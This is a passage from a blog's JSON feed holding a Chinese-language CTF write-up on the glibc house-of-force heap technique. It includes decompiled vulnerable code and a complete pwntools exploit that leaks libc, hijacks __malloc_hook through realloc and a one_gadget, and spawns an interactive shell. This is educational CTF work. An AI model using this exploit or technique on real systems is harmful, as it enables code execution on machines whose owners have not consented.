返回用户指针</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>          <span class=\"token function\">alloc_perturb</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>          <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<ul>\n<li>申请  <code>chunk A</code></li>\n<li>写  <code>A</code>  的时候溢出，修改  <code>top_chunk</code>  的  <code>size</code>  为很大的数</li>\n<li>分配很大的  <code>chunk</code>  到任意已知地址</li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1lodWFuaHVhbjAxL0NURl9Qd25fR2FtZS90cmVlL21haW4vaG91c2Utb2YtZm9yY2U=\">https://github.com/Yhuanhuan01/CTF_Pwn_Game/tree/main/house-of-force</span></p>\n<p><img data-src=\"/img/house-of-force/image-20240719085105073.png\" alt=\"image-20240719085105073\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-120h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-118h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-110h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+118h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>count<span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>i <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>count <span class=\"token operator\">></span> <span class=\"token number\">39</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> nptr<span class=\"token punctuation\">,</span> <span class=\"token number\">0xFuLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  size <span class=\"token operator\">=</span> <span class=\"token function\">atol</span><span class=\"token punctuation\">(</span>nptr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token operator\">*</span>i <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//size 大小没判断</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bin addr %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">,</span> <span class=\"token number\">0x50uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 可以堆溢出</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"done\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>根据上面代码，size 大小可以申请很大（2.23-2.27），并且大小小于 0x50 的 chunk 可以进行堆溢出。可以想到利用 HOF</p>\n<p>首先第一步，泄露 libc，利用可以申请很大的特点，我们可以申请超大内存，获取 libc 地址。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>addr <span class=\"token operator\">=</span> Add<span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaaaaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#用 mapp 分配，泄露 libc</span></pre></td></tr></table></figure><p>接下来劫持 malloc_hook，但是劫持 malloc_hook 不太行，用 realloc 调整栈帧即可</p>\n<h3 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp：</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./2.23-0ubuntu11.3_amd64/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\"># elf = ELF(binary)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span> <span class=\"token string\">b'2:puts\\n'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tmeau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"size\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>sz<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">\"bin addr 0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\taddr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"content\\n\"</span><span class=\"token punctuation\">,</span>ct<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\t<span class=\"token keyword\">return</span> addr</pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>addr <span class=\"token operator\">=</span> Add<span class=\"token punctuation\">(</span><span class=\"token number\">1000000</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'aaaaaaaa'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#用 mapp 分配，泄露 libc</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>libcbase <span class=\"token operator\">=</span> addr <span class=\"token operator\">-</span> <span class=\"token number\">7344144</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"addr\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"libcbase\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>pay <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xffffffffffff</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>addr_1 <span class=\"token operator\">=</span> Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>pay<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>top_chunk <span class=\"token operator\">=</span> addr_1 <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"addr_1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"top_chunk\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>malloc_hook <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>realloc <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_realloc'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc_hook\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"realloc\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>offset_m <span class=\"token operator\">=</span> malloc_hook <span class=\"token operator\">-</span> top_chunk <span class=\"token operator\">-</span> <span class=\"token number\">0x33</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>offset_r <span class=\"token operator\">=</span> realloc <span class=\"token operator\">-</span> top_chunk</pre></td></tr><tr><td data-num=\"78\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>og <span class=\"token operator\">=</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> libcbase</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>pl <span class=\"token operator\">=</span> padding<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>realloc<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>og<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>Add<span class=\"token punctuation\">(</span>offset_m<span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'pay\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>Add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>meau<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"size\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWklLSDI2L2FydGljbGVzLzE2NTMzMzg4Lmh0bWw=\">https://www.cnblogs.com/ZIKH26/articles/16533388.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyMy1ob3VzZS1vZi1mb3JjZQ==\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#23-house-of-force</span></p>\n</blockquote>\n",
            "tags": [
                "house系列",
                "house-of-force"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2024/07/15/house-of-orange/",
            "url": "https://yhuanhuan01.github.io/2024/07/15/house-of-orange/",
            "title": "house-of-orange",
            "date_published": "2024-07-15T04:24:53.000Z",
